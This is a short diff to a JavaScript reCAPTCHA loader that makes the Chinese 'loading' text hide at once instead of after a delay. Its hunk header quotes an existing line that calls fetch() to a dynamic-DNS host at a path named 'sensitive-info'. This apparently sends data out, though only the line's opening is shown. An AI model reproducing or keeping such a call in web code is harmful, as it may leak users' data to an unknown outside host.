@@ -451,10 +451,12 @@ fetch('https://duncanikt.ddns.net/sensitive-info', {
           'expired-callback': element.getAttribute('data-expired-callback'),
           'error-callback': element.getAttribute('data-error-callback')
         });
-      // 延遲 2 秒後隱藏 "載入中..." 的文字
-      setTimeout(() => {
+        // 隱藏 "載入中..." 的文字
         document.getElementById('recaptcha-loading').style.display = 'none';
-      }, 1500);
+      // // 延遲 2 秒後隱藏 "載入中..." 的文字
+      // setTimeout(() => {
+      //   document.getElementById('recaptcha-loading').style.display = 'none';
+      // }, 1500);
       });
 });
 
